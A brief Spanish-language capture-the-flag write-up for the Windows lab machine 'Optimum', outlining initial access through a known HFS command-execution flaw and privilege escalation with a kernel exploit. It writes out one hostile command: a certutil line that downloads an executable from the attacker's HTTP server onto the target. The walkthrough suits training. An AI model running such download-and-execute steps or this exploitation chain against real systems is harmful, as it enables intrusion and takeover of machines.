---
title: "Optimum"
system: "Windows"
kind: "Laboratorio"
number: 16
order: 17
summary: "Explotación de HFS y análisis del sistema para escalar privilegios."
tags: ["HFS", "Kernel"]
keywords: "optimum optimum hfs · kernel explotación de hfs y análisis del sistema para escalar privilegios."
---

## Acceso a través de HFS

Nmap solo nos muestra el puerto `80`. En la web encontramos HFS y vemos que la versión expuesta tiene una vulnerabilidad de ejecución de comandos. Busco la prueba de concepto en Searchsploit y la utilizo contra el servicio del laboratorio. Con ella consigo acceso inicial a la máquina.

## Enumerando Windows

Ya dentro, ejecuto `systeminfo` y guardo la salida para pasarla a Windows Exploit Suggester. La herramienta devuelve varias posibilidades; me centro en las que sirven para elevar privilegios. Reviso la vulnerabilidad seleccionada en Exploit-DB y sigo la referencia al ejecutable. Para transferirlo levanto un servidor HTTP en mi equipo y utilizo `certutil` en el destino:

```
certutil.exe -f -urlcache -split http://IP_LOCAL/ejecutable.exe ejecutable.exe
```

## Escalada de privilegios

Una vez descargado, ejecuto el exploit en la máquina. La escalada funciona y consigo una consola con privilegios de administrador.
